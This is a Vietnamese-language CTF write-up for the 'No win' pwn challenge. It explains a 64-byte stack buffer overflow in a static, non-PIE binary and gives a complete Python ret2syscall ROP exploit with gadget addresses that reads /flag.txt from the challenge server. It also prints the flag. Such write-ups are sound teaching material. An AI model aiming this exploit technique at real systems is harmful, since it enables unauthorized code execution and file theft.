# [Pwn] No win – Writeup

**Challenge:** No win  
**Category:** Pwn / ROP  
**Difficulty:** Medium  
**Author:** NNSC  
**Flag:** `NNS{No_Win_FunC71on_5o_Y0u_Buil7_yoUR_oWN_sy5c4ll}`

---

## 1. Mô tả challenge

```text
ncat --ssl no-win-scenario-92fde3e47349.chall.nnsc.tf 1337
```

Handout gồm:
- `chall.c` – source code
- `no-win` – binary đã compile
- `README.md`

### Source code (`chall.c`)

```c
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char buf[64];

    setvbuf(stdout, NULL, _IONBF, 0);
    puts("no win(), so good luck");
    printf("> ");
    read(STDIN_FILENO, buf, 512);

    return 0;
}
```

Rõ ràng đây là **buffer overflow** kinh điển:
- Buffer chỉ 64 byte
- `read()` cho phép ghi tới **512 byte** → overflow cực lớn

Đặc biệt challenge nhấn mạnh: **không có hàm `win()`**.

---

## 2. Phân tích binary

```bash
$ file no-win
ELF 64-bit LSB executable, x86-64, statically linked, ...

$ checksec no-win
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found? → No
NX:       NX enabled
PIE:      No PIE
```

**Điểm quan trọng:**
- **Statically linked** → toàn bộ libc nằm trong binary
- **Không PIE** → địa chỉ code cố định
- **NX** bật → không thể shellcode trên stack
- Không có canary

Vì static nên ta có đầy đủ gadget và syscall.

---

## 3. Kỹ thuật khai thác: ROP + Syscall (ret2syscall)

Vì không có `system`, `execve` hay hàm `win`, ta phải **tự xây dựng syscall** để:
1. `open("/flag.txt", O_RDONLY)`
2. `read(fd, buf, size)`
3. `write(1, buf, size)`

Đây chính là kỹ thuật **ret2syscall**.

### 3.1. Tìm offset

```
buf[64] → saved RBP (8 byte) → saved RIP (8 byte)
```

→ Offset đến return address = **0x48** (72 byte).

### 3.2. Các gadget cần thiết

```text
pop rax ; ret                  → 0x427eeb
pop rdi ; pop rbp ; ret        → 0x402128
pop rsi ; pop rbp ; ret        → 0x40a3c2
pop rdx ; ret                  → 0x413210
syscall ; ret                  → 0x410f46   ← rất quan trọng
```

> Lưu ý: Chỉ dùng gadget `syscall` (không có `ret`) sẽ bị fall-through sang instruction tiếp theo → crash. Phải dùng `syscall ; ret`.

### 3.3. Writable memory

```text
.bss = 0x4abac0
```

Ta sẽ dùng vùng này để chứa path `/flag.txt` và nội dung flag.

---

## 4. Xây dựng ROP chain

### Giai đoạn 1: Ghi path vào `.bss`

```text
read(0, bss, 0x20)
```

### Giai đoạn 2: Mở file

```text
open(bss, 0)          # SYS_open = 2
```

### Giai đoạn 3: Đọc flag

```text
read(fd, bss+0x40, 0x100)
```

### Giai đoạn 4: In flag ra stdout

```text
write(1, bss+0x40, 0x100)
```

### Vấn đề file descriptor

Trên local, `open` thường trả về `fd = 3`.  
Trên remote (do dùng SSL + môi trường container), `open` trả về **`fd = 6`**.

→ Phải thử hoặc leak `rax` sau `open`. Trong writeup này ta dùng `fd = 6`.

---

## 5. Full Exploit

```python
from struct import pack
import socket
import ssl
import time

# ========== Gadgets ==========
pop_rax       = 0x427eeb
pop_rdi_rbp   = 0x402128
pop_rsi_rbp   = 0x40a3c2
pop_rdx       = 0x413210
syscall_ret   = 0x410f46
bss           = 0x4abac0

def p64(x):
    return pack("<Q", x)

# ========== ROP Chain ==========
rop = b""

# 1. read(0, bss, 0x20)  → nhận path
rop += p64(pop_rax) + p64(0)
rop += p64(pop_rdi_rbp) + p64(0) + p64(0)
rop += p64(pop_rsi_rbp) + p64(bss) + p64(0)
rop += p64(pop_rdx) + p64(0x20)
rop += p64(syscall_ret)

# 2. open(bss, 0)
rop += p64(pop_rax) + p64(2)
rop += p64(pop_rdi_rbp) + p64(bss) + p64(0)
rop += p64(pop_rsi_rbp) + p64(0) + p64(0)
rop += p64(pop_rdx) + p64(0)
rop += p64(syscall_ret)

# 3. read(6, bss+0x40, 0x100)
rop += p64(pop_rax) + p64(0)
rop += p64(pop_rdi_rbp) + p64(6) + p64(0)          # fd = 6 trên remote
rop += p64(pop_rsi_rbp) + p64(bss + 0x40) + p64(0)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(syscall_ret)

# 4. write(1, bss+0x40, 0x100)
rop += p64(pop_rax) + p64(1)
rop += p64(pop_rdi_rbp) + p64(1) + p64(0)
rop += p64(pop_rsi_rbp) + p64(bss + 0x40) + p64(0)
rop += p64(pop_rdx) + p64(0x100)
rop += p64(syscall_ret)

# ========== Payload ==========
payload = b"A" * 0x48 + rop
payload = payload.ljust(512, b"B")          # pad đúng 512 byte

path = b"/flag.txt\x00"

# ========== Connect ==========
host = "no-win-scenario-92fde3e47349.chall.nnsc.tf"
port = 1337

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

sock = socket.create_connection((host, port))
ssock = ctx.wrap_socket(sock, server_hostname=host)

# Nhận prompt
data = b""
while b"> " not in data:
    data += ssock.recv(1)
print("[*] Prompt:", data)

# Gửi payload + path cùng lúc
ssock.sendall(payload + path)
print("[*] Payload sent")

time.sleep(1)
flag = ssock.recv(200)
print("[+] Flag:", flag)

ssock.close()
```

---

## 6. Giải thích chi tiết kỹ thuật

### 6.1. Tại sao phải pad đúng 512 byte?

`read(STDIN_FILENO, buf, 512)` sẽ đọc tối đa 512 byte.  
Nếu gửi ít hơn 512 byte, `read` sẽ **block** chờ thêm dữ liệu.

→ Ta pad payload thành đúng 512 byte, sau đó gửi path.  
Khi ROP chạy đến `read(0, bss, 0x20)`, path đã nằm sẵn trong socket buffer.

### 6.2. Tại sao dùng `syscall ; ret` thay vì `syscall`?

Gadget `0x401324: syscall` **không có `ret`**.  
Sau khi syscall xong, CPU sẽ thực thi instruction ngay phía sau → crash.

Gadget `0x410f46: syscall ; ret` mới trả về ROP chain đúng cách.

### 6.3. File descriptor = 6

Trên môi trường remote (do wrapper SSL + các fd hệ thống),  
`open()` trả về `fd = 6` thay vì `3`.

Cách xác định:
- Thử lần lượt `fd = 3,4,5,6...`
- Hoặc sau `open` thì `write(1, &rax, 8)` để leak giá trị trả về.

### 6.4. Không cần ret2csu

Binary static + có đầy đủ `pop rax/rdi/rsi/rdx` nên ta set register **từng cái một** rồi gọi `syscall` trực tiếp.  
ret2csu chỉ cần thiết khi thiếu gadget `pop rdx` hoặc `pop rsi`.

---

## 7. Tóm tắt kỹ thuật sử dụng

| Kỹ thuật              | Mục đích                              |
|-----------------------|---------------------------------------|
| Buffer Overflow       | Ghi đè return address                 |
| ROP                   | Kiểm soát luồng thực thi              |
| ret2syscall           | Gọi `open/read/write` bằng syscall    |
| Static binary analysis| Lấy gadget + địa chỉ cố định          |
| BSS as writable area  | Chứa path + nội dung flag            |

---

## 8. Flag

```
NNS{No_Win_FunC71on_5o_Y0u_Buil7_yoUR_oWN_sy5c4ll}
```

---

**Bài học:**  
Khi challenge nói “no win()”, đừng tìm `win` – hãy **tự xây dựng** chức năng bạn cần bằng ROP + syscall.  
Đó chính là tinh thần của challenge này.
